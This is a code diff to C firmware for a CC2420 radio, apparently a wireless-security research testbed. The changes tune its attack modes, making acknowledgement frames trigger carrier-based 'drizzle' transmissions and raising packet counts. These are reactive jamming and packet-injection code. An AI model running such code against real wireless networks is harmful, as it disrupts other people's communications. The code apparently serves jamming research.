@@ -62,10 +62,11 @@
 
 #define CHANNEL 26
 #define TXPOWER_LEVEL 3
+#define DEFAULT_MODE ACK
 
 #define TX_INTERVAL (CLOCK_SECOND / 1)
 #define ATTACK_GAP (CLOCK_SECOND * 1)
-#define MAX_TX_PACKETS 1
+#define MAX_TX_PACKETS 10
 #define PAYLOAD_LEN 20
 /* exprimental value used to occupy near full bandwidth, assuming RIMTER_SECOND = 4096 * N */
 /* "SFD gap" = 298 us out of 4395 us Droplet interval => actual free air time = 298 - 160 (preamble+SFD) = 138 us => free bandwidth = 138/4395 = 3.1% */
@@ -115,7 +116,7 @@ static uint8_t rp_en = 0;
 static uint8_t air = 0;
 static uint8_t hexin = 0;
 static uint8_t tx_source = TX_SOURCE_DROPLETS;
-static uint8_t manual_crc = 0;
+static uint8_t manual_crc = 1;
 static uint8_t prepend_phy_hdr = 1;
 static uint16_t max_attack_count = MAX_ATTACK_COUNT;
 
@@ -173,7 +174,7 @@ const static struct hex_seq droplets[] =	{
 	{glossy_sync_pkt_reversed, sizeof(glossy_sync_pkt_reversed)},
 };
 
-static int droplet_index;
+static int droplet_index = 4;
 static uint8_t txfifo_data[128];
 static linkaddr_t dst_addr = { {DST_ADDR0, DST_ADDR1} };
 
@@ -421,9 +422,8 @@ reset_transmitter(void)
 	strobe(CC2420_SFLUSHRX);
 
   /* enter RX mode */
-  /* strobe(CC2420_SRXON); */
-	/* strobe(CC2420_SRFOFF); */
-	cc2420_on();
+	/* cc2420_on(); */
+	cc2420_off();
 }
 /*---------------------------------------------------------------------------*/
 /* Transmit a continuous carrier */
@@ -589,6 +589,8 @@ droplet_mode(int new_mode)
 /* 	rtimer_set(&rt, RTIMER_NOW() + RTIMER_SECOND*4096L/1000000L+1, 0, update_txfifo, (void *)0); */
 /* } */
 
+static void attack_eth(void);
+
 static void
 drizzle_mode(int new_mode)
 {
@@ -651,7 +653,7 @@ drizzle_mode(int new_mode)
 		print_hex_buf("tx packet (with CRC): ", pbuf, buflen+2);
 		buflen += 2;
 	}
-
+	/* Optional: fill SYN and PHY header */
 	if (prepend_phy_hdr) {
 		buf[0] = 0x00; // preamble
 		buf[1] = 0xA7; // SFD
@@ -667,8 +669,9 @@ drizzle_mode(int new_mode)
 
 	CC2420_WRITE_FIFO_BUF(txfifo_data, 128);
  start_attack:
-	/* etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND); */
+	PROCESS_CONTEXT_BEGIN(&test_process);
 	etimer_set(&et, max_tx_packets * tx_interval);
+	PROCESS_CONTEXT_END(&test_process);
 	send_carrier(new_mode);
 	ADC1_PORT(OUT) |= BV(ADC1_PIN); // flock lab io tracing signal INT1
 	leds_on(LEDS_RED);
@@ -729,7 +732,6 @@ ack_mode(int new_mode)
 	reg = getreg(CC2420_MDMCTRL0);
 	reg &= ~(AUTOACK | ADR_DECODE);
 	setreg(CC2420_MDMCTRL0, reg);
-	/* strobe(CC2420_SRXON); */
 	cc2420_on();
 }
 
@@ -768,24 +770,28 @@ static void
 ack_handler(uint8_t *frame, uint8_t len)
 {
 	/* printf("ACK pkt size = %u\n", len); */
-	static int ack_begun;
+	/* static int ack_begun; */
 	seqno = 0;
-	if (!ack_begun) {
+	/* if (!ack_begun) { */
 		if (ack_should_begin(frame, len)) {
-			ack_begun = 1;
-			tx_eth();
+			/* ack_begun = 1; */
+			/* tx_eth(); */
+			drizzle_mode(DRIZZLE);
 		}
-	} else {
-		if (ack_should_end(frame, len)) {
-			ack_begun = 0;
-		}
-	}
+	/* } else { */
+	/* 	if (ack_should_end(frame, len)) { */
+	/* 		ack_begun = 0; */
+	/* 	} */
+	/* } */
 }
 
 static void
 ack_eth(void)
 {
-	tx_eth();
+	/* tx_eth(); */
+	attack_eth();
+	// restore RX mode
+	cc2420_on();
 }
 
 static void
@@ -829,16 +835,16 @@ tx_eth(void)
 			print_hex_buf("RP buf: ", buf, buflen);
 		}
 		/* Optional: append payload with manual CRC instead of auto CRC */
- 		if (manual_crc) {
-			uint16_t checksum = crc16_data(buf, buflen, 0);
-			/* printf("checksum = %4x\n", checksum); */
-			buf[buflen] = checksum & 0xFF;
-			buf[buflen+1] = checksum >> 8;
-			print_hex_buf("tx packet (with CRC): ", buf, buflen+2);
-			uint16_t reg = getreg(CC2420_MDMCTRL0);
-			reg &= ~AUTOCRC;
-			setreg(CC2420_MDMCTRL0, reg);
-		}
+ 		/* if (manual_crc) { */
+		/* 	uint16_t checksum = crc16_data(buf, buflen, 0); */
+		/* 	/\* printf("checksum = %4x\n", checksum); *\/ */
+		/* 	buf[buflen] = checksum & 0xFF; */
+		/* 	buf[buflen+1] = checksum >> 8; */
+		/* 	print_hex_buf("tx packet (with CRC): ", buf, buflen+2); */
+		/* 	uint16_t reg = getreg(CC2420_MDMCTRL0); */
+		/* 	reg &= ~AUTOCRC; */
+		/* 	setreg(CC2420_MDMCTRL0, reg); */
+		/* } */
 
 		/* Send packet */
 		// assuming cc2420_send() computes LEN with LEN = payload_len + 2
@@ -919,9 +925,13 @@ attack_eth(void)
 			printf("attack paused after %lu ms, resumes in %lu ms\n",
 			       (et.timer.interval * 1000 + CLOCK_SECOND/2) / CLOCK_SECOND,
 			       (attack_gap * 1000 + CLOCK_SECOND/2) / CLOCK_SECOND);
+			PROCESS_CONTEXT_BEGIN(&test_process);
 			etimer_set(&et, attack_gap);
+			PROCESS_CONTEXT_END(&test_process);
 		} else {
+			PROCESS_CONTEXT_BEGIN(&test_process);
 			etimer_stop(&et);
+			PROCESS_CONTEXT_END(&test_process);
 			rt.ptr = NULL; 		// stop rtimer
 			attack_count = 0;
 			reset_transmitter();
@@ -1394,7 +1404,7 @@ print_chunks(void)
 static void
 print_droplet(void)
 {
-	printf("droplet %u", droplet_index);
+	printf("droplet %u: ", droplet_index);
 	print_hex_buf("0x", droplets[droplet_index].data, droplets[droplet_index].size);
 }
 
@@ -1506,7 +1516,7 @@ PROCESS_THREAD(test_process, ev, data)
   printf("Sampling process starts: channel = %d, txpower level = %u\n", CHANNEL, TXPOWER_LEVEL);
 
   /* initialize transceiver mode */
-  start_mode(0);
+  start_mode(DEFAULT_MODE);
 
 	unsigned reg;
 	reg = getreg(CC2420_IOCFG0);
